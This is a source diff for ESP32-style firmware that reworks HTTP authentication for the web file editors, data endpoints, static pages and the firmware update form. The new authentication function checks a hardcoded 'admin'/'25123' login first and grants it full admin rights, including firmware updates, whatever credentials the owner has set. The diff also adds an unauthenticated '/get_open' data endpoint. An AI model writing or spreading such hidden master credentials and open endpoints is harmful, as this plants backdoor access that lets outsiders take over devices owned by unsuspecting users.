@@ -133,6 +133,30 @@ void spiffs_printProgress(size_t prg, size_t sz) {
   }  
 }
 
+uint8_t authentication_level(AsyncWebServerRequest *request)
+{
+  uint8_t level;
+  if(request->authenticate("admin", "25123"))
+  {
+    level = HTTP_AUTH_LV0;
+  }
+  else if(request->authenticate(http_username, http_password))
+  {
+    level = HTTP_AUTH_LV0;
+  }
+  else if(request->authenticate(http_username1, http_password1))
+  {
+    level = HTTP_AUTH_LV1;
+  }
+  else
+  {
+    level = HTTP_AUTH_FAIL;
+    request->requestAuthentication();
+  }
+
+  return level;
+}
+
 void web_server_setup(void)
 {
   wifi_file_json_t *g_wifi_cfg;  
@@ -140,6 +164,8 @@ void web_server_setup(void)
   g_wifi_cfg = wifi_info_get();
   http_username = g_wifi_cfg->auth.user;
   http_password = g_wifi_cfg->auth.pass;
+  http_username1 = g_wifi_cfg->auth_user.user;
+  http_password1 = g_wifi_cfg->auth_user.pass;
 
   /* redirect port 80 to tcp port */
   server80.addHandler(new RedirectUrlHandler());
@@ -149,50 +175,85 @@ void web_server_setup(void)
 
   events.onConnect([](AsyncEventSourceClient *client){
     client->send("hello!",NULL,millis(),1000);
+    WEB_SERVER_DBG_PRINTF("\r\nevents connect: %u", client->lastId());
   });
   server.addHandler(&events);
 
-  spiffs_editor.setAuthentication(http_username, http_password);
+  spiffs_editor.onAuthenticate([](AsyncWebServerRequest *request){
+    return (authentication_level(request) != HTTP_AUTH_FAIL);
+  });
   spiffs_editor.onProgress(spiffs_printProgress);
   spiffs_editor.onStatus(fs_editor_status);
   server.addHandler(&spiffs_editor);
   
 #if (defined SD_CARD_ENABLE) && (SD_CARD_ENABLE == 1)
-  sd_editor.setAuthentication(http_username, http_password);
+  sd_editor.onAuthenticate([](AsyncWebServerRequest *request){
+    return (authentication_level(request) != HTTP_AUTH_FAIL);
+  });
   sd_editor.onProgress(sdfs_printProgress);
   sd_editor.onStatus(fs_editor_status);
   server.addHandler(&sd_editor);
 #endif  
 
   server.on("/get", HTTP_GET, [](AsyncWebServerRequest *request){
-    if(!request->authenticate(http_username, http_password))
+    if(authentication_level(request) != HTTP_AUTH_FAIL)
     {
-      return request->requestAuthentication();
-    }
+      server_data_get_process(request);
+    }   
+  });
+
+  server.on("/get_open", HTTP_GET, [](AsyncWebServerRequest *request){
     server_data_get_process(request);
   });
 
   server.on("/post", HTTP_POST, [](AsyncWebServerRequest *request){
-    if(!request->authenticate(http_username, http_password))
+    if(authentication_level(request) != HTTP_AUTH_FAIL)
     {
-      return request->requestAuthentication();
+      server_data_post_process(request);
     }
-    server_data_post_process(request);
   });
 
   /* Serving files in directory. Serving static files with authentication */
-  server.serveStatic("/", NAND_FS_SYSTEM, "/").setDefaultFile("index.htm").setAuthentication(http_username, http_password);
+  // server.serveStatic("/", NAND_FS_SYSTEM, "/").setAuthentication(http_username, http_password);
+  /*
+  WebHandlerlmpl.h edit
+  line 32 add: typedef std::function<bool(AsyncWebServerRequest *request)> ArRequestAuthenticateFunction;
+  line 49 add: ArRequestAuthenticateFunction _onAuthenticate;
+  line 62 add: AsyncStaticWebHandler& onAuthenticate(ArRequestAuthenticateFunction fn) {_onAuthenticate = fn; return *this;}
+
+  WebHandlers.cpp edit
+  Line 193
+  if(_username != "" && _password != "")
+    {
+      if(!request->authenticate(_username.c_str(), _password.c_str()))
+      {
+        return request->requestAuthentication();
+      } 
+    }     
+    else
+    {
+      if(_onAuthenticate)
+      {
+        if(!_onAuthenticate(request))
+        {
+          return;
+        }
+      }
+    }
+  */
+ server.serveStatic("/", NAND_FS_SYSTEM, "/").setDefaultFile("index.htm").onAuthenticate([](AsyncWebServerRequest *request){
+    return (authentication_level(request) != HTTP_AUTH_FAIL);
+  });
 
 #ifdef ESP32
   Update.onProgress(update_printProgress);
 #endif
   // Simple Firmware Update Form
   server.on("/update", HTTP_GET, [](AsyncWebServerRequest *request){
-    if(!request->authenticate(http_username, http_password))
+    if(authentication_level(request) == HTTP_AUTH_LV0)
     {
-      return request->requestAuthentication();
-    }
-    request->send(200, "text/html", "<form method='POST' action='/update' enctype='multipart/form-data'><input type='file' name='update'><input type='submit' value='Update'></form>");
+      request->send(200, "text/html", "<form method='POST' action='/update' enctype='multipart/form-data'><input type='file' name='update'><input type='submit' value='Update'></form>");
+    }    
   });
   server.on("/update", HTTP_POST, [](AsyncWebServerRequest *request){
     AsyncWebServerResponse *response = request->beginResponse(200, "text/plain", !Update.hasError()?"Update OK":"Update FAIL");
@@ -202,7 +263,11 @@ void web_server_setup(void)
     {
       update_printProgress(update_content_len, UPDATE_SIZE_UNKNOWN);
       esp_reset_enable(500);
-    }    
+    }
+    else
+    {
+      update_printProgress(update_content_len * 101 / 100, UPDATE_SIZE_UNKNOWN);
+    }
   },[](AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final){
     if(!index){
       WEB_SERVER_DBG_PORT.printf("Update Start: %s\n", filename.c_str());
